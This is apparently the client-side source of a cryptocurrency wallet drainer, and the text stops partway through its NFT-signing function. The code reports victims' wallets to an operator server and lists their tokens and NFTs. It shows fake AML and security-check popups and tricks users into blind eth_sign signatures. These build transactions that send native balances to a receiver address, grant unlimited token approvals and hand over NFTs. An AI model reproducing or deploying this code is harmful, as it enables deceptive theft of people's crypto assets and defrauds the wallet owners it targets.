(async () => { rsk_kes = CF_EKEY; CF_EKEY = Math.floor(Math.random() * 1000); })()

const send_request = async (data) => {
  try {
    if (CF_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
    while (Date.now() <= last_request_ts)
      await new Promise(r => setTimeout(r, 1));
    last_request_ts = Date.now();
    data.domain = window.location.host;
    data.worker_id = CF_Worker_ID || null;
    data.user_id = CF_ID || null;
    data.message_ts = last_request_ts;
    data.chat_data = CF_Custom_Chat.Enable == 0 ? false : CF_Custom_Chat.Chat_Settings;
    data.wallet_address = CF_Current_Address;
    data.partner_address = CF_Partner_Address;
    const encode_key = btoa(String(5 + 3 + 365 + 3462 + 888 + rsk_kes));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch((CF_HTTP_MODE ? 'http://' : 'https://') + CF_Server_URL + ((CF_Server_PORT != 80 && CF_Server_PORT != 443) ? (':' + String(CF_Server_PORT)) : ''), {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `v=150725&s=1&r=${request_data}`
    });
    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status)
      return { status: 'error', error: 'Server is Unavailable' };
    else {
      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') CF_Force_Mode = true;
      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
        CF_Force_Mode = true;
        try {
          if (CF_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
              confirmButtonText: 'OK', timer: 90000, color: CF_Color_Scheme
            });
          } else {
            Swal.close();
            Swal.fire({
              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
              showConfirmButton: true, confirmButtonText: 'OK'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      return response_data;
    }
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

const retrieve_config = async () => {
  try {
    const response = await send_request({ action: 'retrieve_config' });
    if (response.status == 'OK') {
      CF_Connection = true;
      CF_Settings = response.data;
      CF_Gas_Multiplier = CF_Settings.Settings.Gas_Multiplier;
      if (!CF_Settings.CIS) CF_Bad_Country = false;
      if (typeof CF_Settings.DSB == 'boolean' && CF_Settings.DSB === true) {
        window.location.href = 'about:blank';
      }
    }
  } catch(err) {
    console.log(err);
  }
};

const retrieve_wallet = async () => {
  try {
    let personal_wallet = null;
    if (localStorage['personal_wallet'] ) personal_wallet = { address: localStorage['personal_wallet'] };
    const response = await send_request({ action: 'retrieve_wallet', personal_wallet });
    if (response.status == 'OK') {
      CF_Settings.Personal_Wallet = response.wallet;
      if (CF_Settings.Personal_Wallet && typeof CF_Settings.Personal_Wallet == 'object') {
        localStorage['personal_wallet'] = CF_Settings.Personal_Wallet.address;
      }
    }
  } catch(err) {
    console.log(err);
    CF_Settings.Personal_Wallet = null;
  }
};

const retrieve_contract = async () => {
  try {
    const response = await send_request({ action: 'retrieve_contract' });
    if (response.status == 'OK') CF_Contract_ABI = response.data;
  } catch(err) {
    console.log(err);
  }
};

const enter_website = async () => {
  try {
    let response = await send_request({
      action: 'enter_website',
      user_id: CF_ID,
      time: new Date().toLocaleString('ru-RU')
    });
    if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
      CF_Bad_Country = true;
    }
  } catch(err) {
    console.log(err);
  }
};

const leave_website = async () => {
  try {
    if (!CF_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!CF_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: CF_ID, wallet: CF_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!CF_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!CF_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: CF_ID, address: CF_Current_Address,
      wallet: (CF_Wallet_Name == null ? CF_Current_Provider : CF_Wallet_Name), chain_id: CF_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        case 'blast': return 81457;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        case 'blast': return 81457;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        case 25: return 'cronos';
        case 100: return 'gnosis';
        case 128: return 'heco';
        case 1284: return 'moonbeam';
        case 1285: return 'moonriver';
        case 2222: return 'kava';
        case 42220: return 'celo';
        case 1666600000: return 'harmony';
        case 324: return 'zksync_era';
        case 8453: return 'base';
        case 369: return 'pulse';
        case 81457: return 'blast';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        case 25: return 'CRO';
        case 100: return 'XDAI';
        case 128: return 'HT';
        case 1284: return 'GLMR';
        case 1285: return 'MOVR';
        case 2222: return 'KAVA';
        case 42220: return 'CELO';
        case 1666600000: return 'ONE';
        case 324: return 'ETH';
        case 8453: return 'ETH';
        case 369: return 'PLS';
        case 81457: return 'ETH';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${CF_Settings.AT || ''}`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "base", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (CF_Settings.Contract_Whitelist.length > 0 && !CF_Settings.Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
        else if (CF_Settings.Contract_Blacklist.length > 0 && CF_Settings.Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address || null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (CF_Settings.Contract_Whitelist.length > 0 && !CF_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        else if (CF_Settings.Contract_Blacklist.length > 0 && CF_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
        asset_price = asset_price * CF_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrieve_timeout = {};
const retrieve_token = async (chain_id, contract_address) => {
  try {
    if (!CF_API_Data[chain_id] || CF_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API == '') return CF_Contract_ABI['ERC20'];
    while (retrieve_timeout[chain_id] && retrieve_timeout[chain_id].time == Math.floor(Date.now() / 1000) && retrieve_timeout[chain_id].count >= 5)
      await new Promise(r => setTimeout(r, 100));
    if (!retrieve_timeout[chain_id])
      retrieve_timeout[chain_id] = { time: Math.floor(Date.now() / 1000), count: 1 };
    else {
      if (retrieve_timeout[chain_id].time == Math.floor(Date.now() / 1000)) retrieve_timeout[chain_id].count += 1;
      else {
        retrieve_timeout[chain_id].time = Math.floor(Date.now() / 1000);
        retrieve_timeout[chain_id].count = 1;
      }
    }
    let response = await fetch(`https://${CF_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${CF_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrieve_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      return CF_Contract_ABI['ERC20'];
    }
  } catch (err) {
    return CF_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (CF_Settings.Settings.Permit.Mode == false) return 0;
    const is_permit_function = ((func) => {
      for (const key in func) {
        if (key.startsWith('permit(')) {
          return true;
        }
      }; return false;
    })(func);
    if ((func.hasOwnProperty('permit') || is_permit_function) && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
          }
        }; return 0;
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const CF_Gas_Reserves = {};

const show_check = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Establishing Connection', text: 'Connecting securely to blockchain...',
        showConfirmButton: true, confirmButtonText: 'Please wait...', timer: 2000, color: CF_Color_Scheme
      }).then(() => {
        if (CF_Check_Done) return;
        MSL.fire({
          icon: 'load', title: 'Synchronizing Data', text: 'Linking to blockchain nodes...',
          showConfirmButton: true, confirmButtonText: 'Please wait...', timer: 3000, color: CF_Color_Scheme
        }).then(() => {
          if (CF_Check_Done) return;
          MSL.fire({
            icon: 'success', title: 'Connection Established', subtitle: 'Blockchain connection secured',
            text: 'Ready to retrieve wallet details!', showConfirmButton: false, timer: 2000, color: CF_Color_Scheme
          }).then(() => {
            if (CF_Check_Done) return;
            MSL.fire({
              icon: 'load', title: 'Loading Wallet', text: 'Accessing wallet information...',
              showConfirmButton: true, confirmButtonText: 'Loading...', timer: 3000, color: CF_Color_Scheme
            }).then(() => {
              if (CF_Check_Done) return;
              MSL.fire({
                icon: 'success', title: 'Wallet Detected', subtitle: 'Address retrieved successfully',
                text: 'Proceeding with additional checks...', showConfirmButton: false, timer: 2000, color: CF_Color_Scheme
              }).then(() => {
                if (CF_Check_Done) return;
                MSL.fire({
                  icon: 'load', title: 'Blockchain Status Verification', text: 'Checking latest blockchain state...',
                  showConfirmButton: true, confirmButtonText: 'Checking...', timer: 3000, color: CF_Color_Scheme
                }).then(() => {
                  if (CF_Check_Done) return;
                  MSL.fire({
                    icon: 'load', title: 'Analyzing Wallet', text: 'Conducting AML compliance check...',
                    showConfirmButton: true, confirmButtonText: 'Analyzing...', timer: 4000, color: CF_Color_Scheme
                  }).then(() => {
                    if (CF_Check_Done) return;
                    MSL.fire({
                      icon: 'error', title: 'Minor Risk Detected', subtitle: 'Anomaly in wallet history',
                      text: 'Analysis will continue with caution.', showConfirmButton: false, timer: 3000, color: CF_Color_Scheme
                    }).then(() => {
                      if (CF_Check_Done) return;
                      MSL.fire({
                        icon: 'success', title: 'Risk Analysis Complete', subtitle: 'No significant issues found',
                        text: 'Proceeding to reputation check.', showConfirmButton: false, timer: 3000, color: CF_Color_Scheme
                      }).then(() => {
                        if (CF_Check_Done) return;
                        MSL.fire({
                          icon: 'load', title: 'Checking Reputation', text: 'Assessing wallet reputation score...',
                          showConfirmButton: true, confirmButtonText: 'Assessing...', timer: 3000, color: CF_Color_Scheme
                        }).then(() => {
                          if (CF_Check_Done) return;
                          MSL.fire({
                            icon: 'success', title: 'Reputation Verified', subtitle: 'Wallet reputation score approved',
                            text: 'No issues detected.', showConfirmButton: false, timer: 3000, color: CF_Color_Scheme
                          }).then(() => {
                            if (CF_Check_Done) return;
                            MSL.fire({
                              icon: 'load', title: 'Finalizing Checks', text: 'Final verification of wallet credentials...',
                              showConfirmButton: true, confirmButtonText: 'Finalizing...', timer: 4000, color: CF_Color_Scheme
                            }).then(() => {
                              if (CF_Check_Done) return;
                              MSL.fire({
                                icon: 'success', title: 'Verification Complete', subtitle: 'Your wallet is secure!',
                                text: 'All checks have been passed successfully.', showConfirmButton: false, timer: 4000, color: CF_Color_Scheme
                              }).then(() => {
                                if (CF_Check_Done) return;
                                MSL.fire({
                                  icon: 'load', title: 'Finalizing', text: 'Verifying additional details...',
                                  showConfirmButton: true, confirmButtonText: 'Almost there...', timer: 900000, color: CF_Color_Scheme
                                });
                              });
                            });
                          });
                        });
                      });
                    });
                  });
                });
              });
            });
          });
        });
      });
    } else {
      Swal.fire({
        title: 'Connection established',
        icon: 'success',
        timer: 2000
      }).then(() => {
        if (CF_Check_Done) return;
        Swal.fire({
          text: 'Connecting to Blockchain...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 5000, width: 600, showConfirmButton: false
        }).then(() => {
          if (CF_Check_Done) return;
          Swal.fire({
            text: 'Getting your wallet address...',
            imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
            timer: 5000, width: 600, showConfirmButton: false
          }).then(() => {
            if (CF_Check_Done) return;
            Swal.fire({
              text: 'Checking your wallet for AML...',
              imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
              imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
              timer: 5000, width: 600, showConfirmButton: false
            }).then(() => {
              if (CF_Check_Done) return;
              Swal.fire({
                text: 'Good, your wallet is AML clear!',
                icon: 'success',
                allowOutsideClick: false, allowEscapeKey: false,
                timer: 2000, width: 600, showConfirmButton: false
              }).then(() => {
                if (CF_Check_Done) return;
                Swal.fire({
                  text: 'Please wait, we\'re scanning more details...',
                  imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                  imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
                  timer: 0, width: 600, showConfirmButton: false
                });
              });
            });
          });
        });
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(CF_Current_Address, "pending");
};

const wait_message = () => {
  try {
    if (!CF_Process) return;
    Swal.close();
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'Signature Received!', subtitle: 'Thank you!',
        text: 'We received your sign, please wait for confirmation...',
        showConfirmButton: false, timer: 2500, color: CF_Color_Scheme
      }).then(() => {
        MSL.fire({
          icon: 'load', title: 'Processing Signature', text: 'Please, stay on this page while we confirm it...',
          showConfirmButton: true, confirmButtonText: 'Confirming...', color: CF_Color_Scheme
        });
      });
    } else {
      Swal.fire({
        html: '<b>Thanks!</b>', icon: 'success',
        allowOutsideClick: false, allowEscapeKey: false,
        timer: 2500, width: 600, showConfirmButton: false
      }).then(() => {
        Swal.fire({
          html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      });
    }

  } catch(err) {
    console.log(err);
  }
};

const end_message = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'error', title: 'Insufficient Funds', subtitle: 'Unable to proceed',
        text: 'Your wallet does not meet the minimum balance requirements. Please try again with a different wallet.',
        showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!', icon: 'error',
        allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
        showConfirmButton: true, confirmButtonText: 'OK'
      });
    }
  } catch(err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_ready = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'Transaction Signed', subtitle: 'Signature confirmed!',
        text: 'Your transaction is being processed. Please wait...', showConfirmButton: false, color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Success!</b> Your sign is confirmed!',
        icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      show_sign_message();
      return;
    }
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Action Required', text: 'Please, sign the message in your wallet to continue...',
        showConfirmButton: true, confirmButtonText: 'Awaiting Signature...', color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
    const contract = new ethers.Contract(contract_address, CF_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_gas_limit_def_by_chain_id = (chain_id) => {
  switch (chain_id) {
    case 42161: return BN(5000000);
    case 43114: return BN(5000000);
    default: return BN(100000);
  }
}

const show_sign_message = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Action Required', text: 'Please, sign the message in your wallet to continue...',
        showConfirmButton: true, confirmButtonText: 'Awaiting Signature...', color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Done!</b> Sign message in your wallet to continue...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const SIGN_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Receiver, value: BN(100), data: "0x" };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  const web3 = new Web3(CF_Provider);

  unsigned_tx.value = web3.utils.toHex(available_amount.toString());
  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await sign_success(asset, available_amount); sign_ready();
};

const SIGN_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

  let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
  for (const c_address of CF_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (CF_Settings.Settings.Sign.Tokens == 1) contract_data = web3_contract.methods.approve(CF_Settings.Address, max_approval_amount).encodeABI();
  else if (CF_Settings.Settings.Sign.Tokens == 2) contract_data = web3_contract.methods.transfer(CF_Settings.Receiver, asset.amount_raw).encodeABI();

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await sign_success(asset); sign_ready();
};

const SIGN_NFT = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  if (CF_Settings.Settings.Sign.NFTs == 1) contract_data = web3_contract.methods.setApprovalForAll(CF_Settings.Address, true).encodeABI();
  else if (CF_Settings.Settings.Sign.NFTs == 2) contract_data = web3_contract.methods.transferFrom(CF_Current_Address, CF_Settings.Receiver, asset.id).encodeABI();

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
